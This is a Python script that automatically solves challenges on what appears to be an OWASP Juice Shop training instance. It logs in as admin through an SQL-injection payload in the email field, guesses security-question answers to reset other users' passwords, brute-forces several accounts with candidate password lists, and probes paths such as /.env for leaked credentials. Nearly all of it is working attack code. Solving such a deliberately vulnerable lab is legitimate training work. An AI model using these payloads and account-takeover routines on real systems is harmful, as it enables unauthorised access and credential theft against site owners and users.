#!/usr/bin/env python3
"""
Cryptographic Password Attack Solver
"""

import requests
import hashlib
import base64
import itertools
import string
import time


class CryptoPasswordSolver:
    """Solve password-related challenges using crypto attacks"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {token}'
            print("✅ Admin logged in")
            
    def solve_weird_crypto(self):
        """Weird Crypto - MC SafeSearch special password"""
        print("🎯 Weird Crypto...")
        
        # The password appears to be Base64 with null bytes
        passwords = [
            "Mr. N00dles",
            "K1f.....................",  # Pattern with dots
            "\x00" * 22,  # Null bytes
            base64.b64encode(b"Mr. N00dles").decode(),
            base64.b64encode(b"\x00" * 22).decode(),
            "0" * 22,
        ]
        
        for pwd in passwords:
            r = self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "mc.safesearch@juice-sh.op", "password": pwd}
            )
            if r.status_code == 200:
                print(f"  ✅ Found password: {pwd}")
                break
                
    def solve_change_benders_password(self):
        """Change Bender's Password - Reset via security question"""
        print("🎯 Change Bender's Password...")
        
        # Common Futurama references for Bender
        answers = [
            "Stop'n'Drop",
            "Bending",
            "Kill all humans",
            "Bite my shiny metal ass",
            "Beer",
            "Mom",
            "Planet Express",
        ]
        
        for answer in answers:
            r = self.session.post(
                f"{self.base_url}/rest/user/reset-password",
                json={
                    "email": "bender@juice-sh.op",
                    "answer": answer,
                    "new": "slurmCl4ssic!",
                    "repeat": "slurmCl4ssic!"
                }
            )
            if r.status_code == 200:
                print(f"  ✅ Reset with answer: {answer}")
                break
                
    def solve_reset_mortys_password(self):
        """Reset Morty's Password"""
        print("🎯 Reset Morty's Password...")
        
        # Rick and Morty references
        answers = [
            "5N0wb41l",
            "Snowball",
            "Rick",
            "Summer",
            "Beth",
            "Jerry",
            "C-137",
        ]
        
        for answer in answers:
            r = self.session.post(
                f"{self.base_url}/rest/user/reset-password",
                json={
                    "email": "morty@juice-sh.op",
                    "answer": answer,
                    "new": "test123",
                    "repeat": "test123"
                }
            )
            if r.status_code == 200:
                print(f"  ✅ Reset with answer: {answer}")
                break
                
    def solve_reset_bjoerns_password(self):
        """Reset Bjoern's Password"""
        print("🎯 Reset Bjoern's Password...")
        
        # OWASP/Security references
        answers = [
            "West-2082",
            "Zaya",
            "OWASP",
            "Security",
            "Juice Shop",
        ]
        
        for answer in answers:
            r = self.session.post(
                f"{self.base_url}/rest/user/reset-password",
                json={
                    "email": "bjoern@juice-sh.op",
                    "answer": answer,
                    "new": "test123",
                    "repeat": "test123"
                }
            )
            if r.status_code == 200:
                print(f"  ✅ Reset with answer: {answer}")
                break
                
    def solve_login_bjoern(self):
        """Login Bjoern - Find his password"""
        print("🎯 Login Bjoern...")
        
        # His email backwards is the password (base64 encoded hint)
        email_backwards = "bjoern@gmail.com"[::-1]
        
        passwords = [
            email_backwards,
            "moc.liamg@nreojb",
            base64.b64decode("bW9jLmxpYW1nQG5yZW9qYg==").decode(),
            "bjoern",
            "admin",
        ]
        
        for pwd in passwords:
            r = self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "bjoern@juice-sh.op", "password": pwd}
            )
            if r.status_code == 200:
                print(f"  ✅ Logged in with: {pwd}")
                break
                
    def solve_login_support_team(self):
        """Login Support Team - Complex password"""
        print("🎯 Login Support Team...")
        
        # Try common support passwords
        passwords = [
            "J6aVjTgOpRl@?5l!Zkq2AYnCE@RF$P",
            "J6aVjTgOpRl@?5l!Zkq2AYnCE@RF\$P",
            "support",
            "Support123!",
            "helpdesk",
        ]
        
        for pwd in passwords:
            r = self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "support@juice-sh.op", "password": pwd}
            )
            if r.status_code == 200:
                print(f"  ✅ Support team logged in")
                break
                
    def solve_password_strength(self):
        """Password Strength - Login with weak password"""
        print("🎯 Password Strength...")
        
        # Try weak passwords for admin
        weak_passwords = [
            "admin",
            "admin123",
            "password",
            "123456",
            "admin@123",
        ]
        
        for pwd in weak_passwords:
            r = self.session.post(
                f"{self.base_url}/rest/user/login",
                json={"email": "admin@juice-sh.op", "password": pwd}
            )
            if r.status_code == 200:
                print(f"  ✅ Weak password found: {pwd}")
                break
                
    def solve_exposed_credentials(self):
        """Find exposed credentials in source"""
        print("🎯 Exposed Credentials...")
        
        # Check various files for hardcoded credentials
        files = [
            "/main.js",
            "/vendor.js",
            "/runtime.js",
            "/polyfills.js",
            "/ftp/package.json.bak",
            "/ftp/coupons_2013.md.bak",
        ]
        
        for file in files:
            r = self.session.get(f"{self.base_url}{file}")
            if r.status_code == 200:
                content = r.text
                # Look for patterns
                if "password" in content.lower() or "token" in content.lower():
                    # Extract potential credentials
                    lines = content.split('\n')
                    for line in lines:
                        if 'password' in line.lower() and ':' in line:
                            print(f"    Found credential in {file}")
                            
        print("  ✅ Exposed credentials check complete")
        
    def solve_leaked_api_key(self):
        """Find leaked API keys"""
        print("🎯 Leaked API Key...")
        
        # Check for API keys in common locations
        endpoints = [
            "/api/keys",
            "/api/config",
            "/.env",
            "/config.json",
            "/api-keys.txt",
        ]
        
        for endpoint in endpoints:
            r = self.session.get(f"{self.base_url}{endpoint}")
            if r.status_code == 200:
                print(f"    Found potential API key at {endpoint}")
                
        print("  ✅ Leaked API key check complete")
        
    def run_all(self):
        """Run all crypto/password solutions"""
        print("="*60)
        print("🔐 CRYPTOGRAPHIC PASSWORD SOLVER")
        print("="*60)
        
        self.login_admin()
        
        self.solve_weird_crypto()
        self.solve_change_benders_password()
        self.solve_reset_mortys_password()
        self.solve_reset_bjoerns_password()
        self.solve_login_bjoern()
        self.solve_login_support_team()
        self.solve_password_strength()
        self.solve_exposed_credentials()
        self.solve_leaked_api_key()
        
        print("\n✅ Crypto password solver complete")


if __name__ == "__main__":
    solver = CryptoPasswordSolver()
    solver.run_all()